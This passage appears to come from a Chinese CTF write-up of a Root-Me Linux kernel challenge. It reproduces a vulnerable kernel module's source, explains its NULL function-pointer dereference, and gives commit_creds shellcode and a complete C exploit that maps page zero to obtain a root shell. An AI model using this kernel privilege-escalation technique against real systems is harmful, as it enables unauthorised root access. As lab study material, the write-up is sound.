<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~/nullpoint/initramfs/lib/modules/4.10.3/rootme$ file tostring.ko </span><br><span class="line">tostring.ko: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), BuildID[sha1]=d55b3e2795a90b029627ae2fcc47291702c1784b, not stripped</span><br><span class="line">winter@ubuntu:~/nullpoint/initramfs/lib/modules/4.10.3/rootme$ checksec tostring.ko </span><br><span class="line">[*] '/home/winter/nullpoint/initramfs/lib/modules/4.10.3/rootme/tostring.ko'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
<p>同样给了源码，<code>ch2.c</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kdev_t.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISSPACE(c)  ((c) == <span class="meta-string">' '</span> || ((c) &gt;= <span class="meta-string">'\t'</span> &amp;&amp; (c) &lt;= <span class="meta-string">'\r'</span>))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISASCII(c)  (((c) &amp; ~0x7f) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISUPPER(c)  ((c) &gt;= <span class="meta-string">'A'</span> &amp;&amp; (c) &lt;= <span class="meta-string">'Z'</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISLOWER(c)  ((c) &gt;= <span class="meta-string">'a'</span> &amp;&amp; (c) &lt;= <span class="meta-string">'z'</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISALPHA(c)  (ISUPPER(c) || ISLOWER(c))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISDIGIT(c)  ((c) &gt;= <span class="meta-string">'0'</span> &amp;&amp; (c) &lt;= <span class="meta-string">'9'</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">local_strtoul</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">char</span>*   nstr,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">char</span>**  endptr,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> base)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !(defined(__KERNEL__))</span></span><br><span class="line">    <span class="keyword">return</span> strtoul (nstr, endptr, base);    <span class="comment">/* user mode */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">char</span>* s = nstr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> acc;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cutoff;</span><br><span class="line">    <span class="keyword">int</span> neg = <span class="number">0</span>, any, cutlim;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        c = *s++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (ISSPACE(c));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">'-'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        neg = <span class="number">1</span>;</span><br><span class="line">        c = *s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">'+'</span>)</span><br><span class="line">        c = *s++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((base == <span class="number">0</span> || base == <span class="number">16</span>) &amp;&amp;</span><br><span class="line">        c == <span class="string">'0'</span> &amp;&amp; (*s == <span class="string">'x'</span> || *s == <span class="string">'X'</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        c = s[<span class="number">1</span>];</span><br><span class="line">        s += <span class="number">2</span>;</span><br><span class="line">        base = <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (base == <span class="number">0</span>)</span><br><span class="line">        base = c == <span class="string">'0'</span> ? <span class="number">8</span> : <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    cutoff = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ULONG_MAX / (<span class="keyword">unsigned</span> <span class="keyword">long</span>)base;</span><br><span class="line">    cutlim = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ULONG_MAX % (<span class="keyword">unsigned</span> <span class="keyword">long</span>)base;</span><br><span class="line">    <span class="keyword">for</span> (acc = <span class="number">0</span>, any = <span class="number">0</span>; ; c = *s++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ISASCII(c))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (ISDIGIT(c))</span><br><span class="line">            c -= <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ISALPHA(c))</span><br><span class="line">            c -= ISUPPER(c) ? <span class="string">'A'</span> - <span class="number">10</span> : <span class="string">'a'</span> - <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c &gt;= base)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (any &lt; <span class="number">0</span> || acc &gt; cutoff || (acc == cutoff &amp;&amp; c &gt; cutlim))</span><br><span class="line">            any = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            any = <span class="number">1</span>;</span><br><span class="line">            acc *= base;</span><br><span class="line">            acc += c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (any &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        acc = INT_MAX;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (neg)</span><br><span class="line">        acc = -acc;</span><br><span class="line">    <span class="keyword">if</span> (endptr != <span class="number">0</span>)</span><br><span class="line">        *((<span class="keyword">const</span> <span class="keyword">char</span> **)endptr) = any ? s - <span class="number">1</span> : nstr;</span><br><span class="line">    <span class="keyword">return</span> (acc);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">dev_t</span> first; <span class="comment">// Global variable for the first device number</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">c_dev</span>;</span> <span class="comment">// Global variable for the character device structure</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">class</span> *<span class="title">cl</span>;</span> <span class="comment">// Global variable for the device class</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tostring_s</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> pointer;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> pointer_max;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *tostring_stack;</span><br><span class="line">  <span class="keyword">ssize_t</span> (*tostring_read)(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off); </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">tostring_s</span> *<span class="title">tostring</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> taille=<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">module_param(taille, <span class="keyword">int</span>,<span class="number">1</span>);</span><br><span class="line">MODULE_PARM_DESC(taille, <span class="string">"Stack size in Ko"</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_open</span><span class="params">(struct inode *i, struct file *f)</span></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: open()\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_close</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: close()\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: read()\n"</span>);</span><br><span class="line">  <span class="keyword">return</span>((tostring-&gt;tostring_read)(f, buf, len, off)); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read_hexa</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: read_hexa()\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> (tostring-&gt;pointer &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>(<span class="built_in">snprintf</span>(buf,len,<span class="string">"%16llx\n"</span>,tostring-&gt;tostring_stack[--(tostring-&gt;pointer)]));</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_create</span><span class="params">(<span class="keyword">int</span> tl)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/*  tostring=kmalloc(sizeof(struct tostring_s), GFP_DMA); */</span></span><br><span class="line">  taille=tl;</span><br><span class="line">  tostring-&gt;tostring_stack=kmalloc(taille*<span class="number">1024</span>, GFP_DMA);</span><br><span class="line">  <span class="keyword">if</span> (tostring-&gt;tostring_stack == <span class="literal">NULL</span>) <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">  tostring-&gt;pointer_max=(taille*<span class="number">1024</span>)/<span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span>);</span><br><span class="line">  tostring-&gt;tostring_read= tostring_read_hexa;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: Stack size: %dK, locate at %p, max index: %d\n"</span>,taille,tostring-&gt;tostring_stack,tostring-&gt;pointer_max);</span><br><span class="line">  <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read_dec</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: read_dec()\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> (tostring-&gt;pointer &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>(<span class="built_in">snprintf</span>(buf,len,<span class="string">"%lld\n"</span>,tostring-&gt;tostring_stack[--(tostring-&gt;pointer)]));</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_write</span><span class="params">(struct file *f, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,<span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">char</span> *bufk;</span><br><span class="line">  <span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: write()\n"</span>);</span><br><span class="line">  <span class="comment">// rajout du 0 final</span></span><br><span class="line">  bufk = kmalloc(len + <span class="number">1</span>, GFP_DMA);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (bufk)&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(bufk, buf, len))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"> </span><br><span class="line">    bufk[len] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;len) &#123;</span><br><span class="line">    <span class="comment">/* Les commandes commencent par 10 '*' */</span></span><br><span class="line">      <span class="keyword">for</span> (j=<span class="number">0</span>;(j&lt;<span class="number">10</span>) &amp;&amp; (bufk[j]==<span class="string">'*'</span>);j++);</span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">10</span>) &#123;</span><br><span class="line">	<span class="keyword">for</span> (j=i+<span class="number">10</span>;(bufk[j]!=<span class="string">'\0'</span>) &amp;&amp; (bufk[j] != <span class="string">'\n'</span>);j++);</span><br><span class="line">	bufk[j]=<span class="string">'\0'</span>;</span><br><span class="line">	printk(<span class="string">"Tostring: Cmd %s\n"</span>,bufk+i+<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">switch</span>(bufk[i+<span class="number">10</span>]) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'H'</span>: </span><br><span class="line">	  tostring-&gt;tostring_read= tostring_read_hexa;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">	  tostring-&gt;tostring_read= tostring_read_dec;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">	  printk(<span class="string">"Tostring: Delete stack\n"</span>);</span><br><span class="line">	  kfree(tostring-&gt;tostring_stack);</span><br><span class="line">	  tostring-&gt;tostring_stack=<span class="literal">NULL</span>;</span><br><span class="line">	  tostring-&gt;tostring_read=<span class="literal">NULL</span>;</span><br><span class="line">	  tostring-&gt;pointer=<span class="number">0</span>;</span><br><span class="line">	  tostring-&gt;pointer_max=<span class="number">0</span>;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'N'</span>:</span><br><span class="line">	  printk(<span class="string">"Tostring: Stack create with size %ld\n"</span>,local_strtoul(bufk+i+<span class="number">11</span>,<span class="literal">NULL</span>,<span class="number">10</span>));</span><br><span class="line">	  <span class="keyword">if</span> (tostring-&gt;tostring_stack==<span class="literal">NULL</span>) tostring_create(local_strtoul(bufk+i+<span class="number">11</span>,<span class="literal">NULL</span>,<span class="number">10</span>));</span><br><span class="line">	  <span class="keyword">if</span> (tostring-&gt;tostring_stack==<span class="literal">NULL</span>) printk(<span class="string">"Tostring: Error, impossible to create stack\n"</span>);</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	i=j+<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">	printk(<span class="string">"tostring: insertion %lld\n"</span>,*((<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *) (bufk+i)));</span><br><span class="line">	<span class="keyword">if</span> (tostring-&gt;pointer &gt;= tostring-&gt;pointer_max) </span><br><span class="line">	  printk(KERN_INFO <span class="string">"Tostring: Stack full\n"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  tostring-&gt;tostring_stack[(tostring-&gt;pointer)++]= *((<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *) (bufk+i));</span><br><span class="line">	i = i+<span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  kfree(bufk);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> len;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pugs_fops</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  .owner = THIS_MODULE,</span><br><span class="line">  .<span class="built_in">open</span> = tostring_open,</span><br><span class="line">  .<span class="built_in">release</span> = tostring_close,</span><br><span class="line">  .<span class="built_in">read</span> = tostring_read,</span><br><span class="line">  .<span class="built_in">write</span> = tostring_write,</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">tostring_init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Constructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring registered"</span>);</span><br><span class="line">  tostring=kmalloc(<span class="keyword">sizeof</span>(struct tostring_s), GFP_DMA);</span><br><span class="line">  tostring_create(taille);</span><br><span class="line">  <span class="keyword">if</span> (alloc_chrdev_region(&amp;first, <span class="number">0</span>, <span class="number">8</span>, <span class="string">"tostring"</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((cl = class_create(THIS_MODULE, <span class="string">"chardrv"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (device_create(cl, <span class="literal">NULL</span>, first, <span class="literal">NULL</span>, <span class="string">"tostring"</span>) == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring error"</span>);</span><br><span class="line">    class_destroy(cl);</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  cdev_init(&amp;c_dev, &amp;pugs_fops);</span><br><span class="line">  <span class="keyword">if</span> (cdev_add(&amp;c_dev, first, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    device_destroy(cl, first);</span><br><span class="line">    class_destroy(cl);</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  printk(KERN_INFO <span class="string">"&lt;Major, Minor&gt;: &lt;%d, %d&gt;\n"</span>, MAJOR(first), MINOR(first));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">tostring_exit</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Destructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring unregistered"</span>);</span><br><span class="line">    kfree(tostring-&gt;tostring_stack);</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">module_init(tostring_init);</span><br><span class="line">module_exit(tostring_exit);</span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"F.Boisson"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"Module Tostring Integers Dec/Hex"</span>);</span><br></pre></td></tr></table></figure>
<p>重要需要注意一下两个函数：tostring_read和tostring_write</p>
<h5 id="read-1"><a href="#read-1" class="headerlink" title="read"></a>read</h5><ol>
<li>打印字符串<code>Tostring: read()\n</code></li>
<li>调用函数<code>tostring-&gt;tostring_read</code></li>
</ol>
<h5 id="write-1"><a href="#write-1" class="headerlink" title="write"></a>write</h5><ol>
<li>打印字符串<code>Tostring: write()\n</code></li>
<li>kmalloc申请chunk</li>
<li>将输入的内容送入chunk</li>
<li>末尾置<code>\0</code></li>
<li>比较前十个字符，是否都为<code>*</code></li>
<li>接着比较第11个字符，是否为<code>H\D\S\N</code>，分别调用不同的功能<ul>
<li>H：<code>tostring-&gt;tostring_read</code>设为<code>tostring_read_hexa</code></li>
<li>D：<code>tostring-&gt;tostring_read</code>设为<code>tostring_read_dec</code></li>
<li>S：清空数据<ul>
<li><code>tostring-&gt;tostring_read</code>设为null</li>
</ul>
</li>
<li>N：初始化</li>
</ul>
</li>
</ol>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><ol>
<li>由于init中有如下指令，故最低可以将mmap映射到0地址。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/vm/mmap_min_addr</span><br></pre></td></tr></table></figure>
<ol>
<li>若将shellcode通过memcpy函数放入0地址</li>
<li>那么在S清空栈的时候，<code>tostring-&gt;tostring_read</code>被设置为null【NULL在Linux中的定义（/usr/include/linux/stddef.h）：#define NULL 0；#define NULL ((void *)0)C++中NULL为0，而Linux C中，NULL为地址0所指向的内容。 】</li>
<li>再次执行read时候，<code>tostring-&gt;tostring_read</code>会执行0地址中的内容，即可get shell</li>
</ol>
<h5 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h5><p>目标是调用<code>commit_creds(prepare_kernel_cred(0))</code>，故可编写如下汇编执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor eax,eax;</span><br><span class="line">call commit_creds;</span><br><span class="line">call prepare_kernel_cred;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210604144540167.png" alt="image-20210604144540167"></p>
<p>有因为commit_creds和prepare_kernel_cred地址已知</p>
<blockquote>
<p>eax是参数？</p>
<p>所以一开始<code>xor eax,eax;</code>将commit_creds参数置零，它的结果放入eax中，作为prepare_kernel_cred的参数，即执行了<code>commit_creds(prepare_kernel_cred(0))</code></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor eax,eax;</span><br><span class="line">call 0xC10711F0;</span><br><span class="line">call 0xC1070E80; </span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>
<p>通过<code>Radare2</code>，生成对应的shellcode</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~/nullpoint$ rasm2 "xor eax,eax ; call 0xC10711F0 ; call 0xC1070E80 ; ret;"</span><br><span class="line">31c0e8e91107c1e8740e07c1c3</span><br></pre></td></tr></table></figure>
<p>对应的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> payload[] = <span class="string">"\x31\xc0\xe8\xe9\x11\x07\xc1\xe8\x74\x0e\x07\xc1\xc3"</span>;</span><br></pre></td></tr></table></figure>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> payload[] = <span class="string">"\x31\xc0\xe8\xe9\x11\x07\xc1\xe8\x74\x0e\x07\xc1\xc3"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Get_shell[<span class="number">20</span>] ; </span><br><span class="line">    mmap(<span class="number">0</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/tostring"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,<span class="string">"**********S"</span>,<span class="number">11</span>);</span><br><span class="line">    <span class="built_in">read</span>(fd,Get_shell,<span class="keyword">sizeof</span>(Get_shell));</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210604174655495.png" alt="image-20210604174655495"></p>
<h5 id="调试信息-1"><a href="#调试信息-1" class="headerlink" title="调试信息"></a>调试信息</h5><p><img src="/2021/06/05/20-29/image-20210604144933474.png" alt="image-20210604144933474"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">add-symbol-file tostring.ko 0xC8824000 -s .data 0xC88247E0 -s .bss 0xC8824A80</span><br></pre></td></tr></table></figure>
<h3 id="3-Root-Me-LinKern-x86-basic-ROP"><a href="#3-Root-Me-LinKern-x86-basic-ROP" class="headerlink" title="3.[Root-Me]LinKern x86 - basic ROP"></a>3.[Root-Me]LinKern x86 - basic ROP</h3><h4 id="下载文件-2"><a href="#下载文件-2" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="https://www.root-me.org/en/Challenges/App-System/LinKern-x86-basic-ROP" target="_blank" rel="noopener">下载地址</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -p 2223 app-systeme-ch39@challenge03.root-me.org </span><br><span class="line">密码:	app-systeme-ch39</span><br></pre></td></tr></table></figure>
<p>拷贝文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -P 2223 app-systeme-ch39@challenge03.root-me.org:/challenge/app-systeme/ch39/* .</span><br><span class="line">密码:	app-systeme-ch39</span><br></pre></td></tr></table></figure>
<h4 id="预备"><a href="#预备" class="headerlink" title="预备"></a>预备</h4><ol>
<li><p>解压img的脚本first.sh</p>
